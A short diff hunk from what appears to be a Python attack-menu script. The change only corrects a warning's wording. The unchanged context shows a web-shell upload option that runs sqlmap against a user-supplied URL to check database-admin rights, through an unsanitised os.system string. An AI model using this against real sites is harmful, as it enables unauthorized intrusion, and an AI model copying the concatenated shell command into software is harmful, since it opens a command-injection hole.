@@ -100,7 +100,7 @@ if at == "M" :
 if at == "SH" : 
     url = input("url => ")
     print(Fore.RED+"""
-    [!] YOU WILL ONLY BE AVAILABLE TO UPLOAD A 
+    [!] YOU WILL ONLY BE ABLE TO UPLOAD A 
     SHELL IF IT SHOWS "dba: True"
     """)
     os.system("sqlmap -u " + url + " --current-user --is-dba")
